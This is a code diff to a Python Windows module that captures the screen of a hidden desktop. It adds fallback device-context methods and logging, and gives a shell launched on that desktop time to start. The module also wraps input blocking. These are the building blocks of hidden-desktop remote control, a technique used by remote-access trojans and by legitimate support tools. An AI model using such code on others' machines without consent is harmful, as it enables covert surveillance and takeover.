@@ -68,6 +68,8 @@ if platform.system() == "Windows":
     BI_RGB = 0
     HORZRES = 8
     VERTRES = 10
+    SM_CXSCREEN = 0
+    SM_CYSCREEN = 1
 
     class BITMAPINFOHEADER(ctypes.Structure):
         _fields_ = [
@@ -115,6 +117,8 @@ if platform.system() == "Windows":
     user32.CloseDesktop.restype = wintypes.BOOL
     user32.SetThreadDesktop.argtypes = [wintypes.HANDLE]
     user32.SetThreadDesktop.restype = wintypes.BOOL
+    user32.GetThreadDesktop.argtypes = [wintypes.DWORD]
+    user32.GetThreadDesktop.restype = wintypes.HANDLE
     user32.BlockInput.argtypes = [wintypes.BOOL]
     user32.BlockInput.restype = wintypes.BOOL
     user32.GetDesktopWindow.argtypes = []
@@ -123,8 +127,12 @@ if platform.system() == "Windows":
     user32.GetWindowRect.restype = wintypes.BOOL
     user32.GetWindowDC.argtypes = [wintypes.HWND]
     user32.GetWindowDC.restype = wintypes.HDC
+    user32.GetDC.argtypes = [wintypes.HWND]
+    user32.GetDC.restype = wintypes.HDC
     user32.ReleaseDC.argtypes = [wintypes.HWND, wintypes.HDC]
     user32.ReleaseDC.restype = wintypes.INT
+    user32.GetSystemMetrics.argtypes = [wintypes.INT]
+    user32.GetSystemMetrics.restype = wintypes.INT
 
     gdi32.CreateCompatibleDC.argtypes = [wintypes.HDC]
     gdi32.CreateCompatibleDC.restype = wintypes.HDC
@@ -270,15 +278,39 @@ def _toggle_block_input(enabled: bool) -> bool:
         return False
 
 
-def _open_hidden_desktop_dc(desktop_path: str | None):
-    if not desktop_path:
+def _get_screen_size() -> tuple[int, int]:
+    """Get screen size using GetSystemMetrics (works for current thread's desktop)."""
+    width = user32.GetSystemMetrics(SM_CXSCREEN)
+    height = user32.GetSystemMetrics(SM_CYSCREEN)
+    return width, height
+
+
+def _create_screen_dc():
+    """Create a DC for the entire screen of current thread's desktop using GetDC(NULL)."""
+    hdc = user32.GetDC(None)
+    if not hdc:
         return None, 0, 0, None
+    
+    width, height = _get_screen_size()
+    if width <= 0 or height <= 0:
+        width = gdi32.GetDeviceCaps(hdc, HORZRES)
+        height = gdi32.GetDeviceCaps(hdc, VERTRES)
+
+    def _cleanup() -> None:
+        try:
+            user32.ReleaseDC(None, hdc)
+        except Exception:
+            pass
+
+    return hdc, width, height, _cleanup
+
+
+def _create_display_dc():
+    """Create a DC for the display using CreateDCW."""
     create_dc = getattr(gdi32, "CreateDCW", None)
     if create_dc is None:
         return None, 0, 0, None
-    hdc = create_dc(desktop_path, None, None, None)
-    if not hdc:
-        hdc = create_dc("DISPLAY", desktop_path, None, None)
+    hdc = create_dc("DISPLAY", None, None, None)
     if not hdc:
         return None, 0, 0, None
     width = int(gdi32.GetDeviceCaps(hdc, HORZRES))
@@ -288,7 +320,7 @@ def _open_hidden_desktop_dc(desktop_path: str | None):
         try:
             gdi32.DeleteDC(hdc)
         except Exception:
-            return
+            pass
 
     return hdc, width, height, _cleanup
 
@@ -357,35 +389,58 @@ class HiddenDesktopCapture:
 
     def _run(self) -> None:
         if not _set_thread_desktop(self._desktop_handle):
+            logger.error("Hidden desktop: SetThreadDesktop failed!")
             return
+        
+        # Verify we're on the correct desktop
+        current_desktop = user32.GetThreadDesktop(ctypes.windll.kernel32.GetCurrentThreadId())
+        logger.info("Hidden desktop: thread desktop handle = %s, target = %s", 
+                    current_desktop, self._desktop_handle)
+        
+        # Wait a bit for desktop to be ready
+        time.sleep(0.3)
+        
         hwindc = None
         width = 0
         height = 0
         release_dc = None
 
-        hwindc, width, height, release_dc = _open_hidden_desktop_dc(self._desktop_path)
-        if hwindc:
-            logger.info("Hidden desktop: capture DC opened via CreateDC.")
+        # Method 1: Try GetDC(NULL) - gets DC for entire screen of current desktop
+        hwindc, width, height, release_dc = _create_screen_dc()
+        if hwindc and width > 0 and height > 0:
+            logger.info("Hidden desktop: capture DC opened via GetDC(NULL), size=%dx%d", width, height)
         else:
-            hwnd = user32.GetDesktopWindow()
-            rect = RECT()
-            if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
-                logger.warning("Hidden desktop: failed to get desktop rect.")
-                return
-            width = max(1, rect.right - rect.left)
-            height = max(1, rect.bottom - rect.top)
-            hwindc = user32.GetWindowDC(hwnd)
-            if not hwindc:
-                logger.warning("Hidden desktop: failed to get window DC.")
-                return
-
-            def _release() -> None:
-                try:
-                    user32.ReleaseDC(hwnd, hwindc)
-                except Exception:
+            if release_dc:
+                release_dc()
+            # Method 2: Try CreateDCW("DISPLAY", ...)
+            hwindc, width, height, release_dc = _create_display_dc()
+            if hwindc and width > 0 and height > 0:
+                logger.info("Hidden desktop: capture DC opened via CreateDC(DISPLAY), size=%dx%d", width, height)
+            else:
+                if release_dc:
+                    release_dc()
+                # Method 3: Fallback to GetWindowDC on desktop window
+                hwnd = user32.GetDesktopWindow()
+                logger.info("Hidden desktop: GetDesktopWindow returned hwnd=%s", hwnd)
+                rect = RECT()
+                if not user32.GetWindowRect(hwnd, ctypes.byref(rect)):
+                    logger.warning("Hidden desktop: failed to get desktop rect, error=%s", ctypes.WinError())
                     return
+                width = max(1, rect.right - rect.left)
+                height = max(1, rect.bottom - rect.top)
+                hwindc = user32.GetWindowDC(hwnd)
+                if not hwindc:
+                    logger.warning("Hidden desktop: failed to get window DC, error=%s", ctypes.WinError())
+                    return
+                logger.info("Hidden desktop: capture DC opened via GetWindowDC, size=%dx%d", width, height)
 
-            release_dc = _release
+                def _release() -> None:
+                    try:
+                        user32.ReleaseDC(hwnd, hwindc)
+                    except Exception:
+                        pass
+
+                release_dc = _release
 
         if width <= 0 or height <= 0:
             logger.warning("Hidden desktop: invalid capture size (%s x %s).", width, height)
@@ -665,6 +720,8 @@ class HiddenDesktopSession:
                 self._processes.append(proc)
             except Exception as exc:
                 logger.warning("Failed to start %s on hidden desktop: %s", cmd, exc)
+        # Give explorer.exe time to initialize the desktop shell
+        time.sleep(0.5)
 
     def launch_application(self, app_name: str) -> None:
         exe = _resolve_app_executable(app_name)
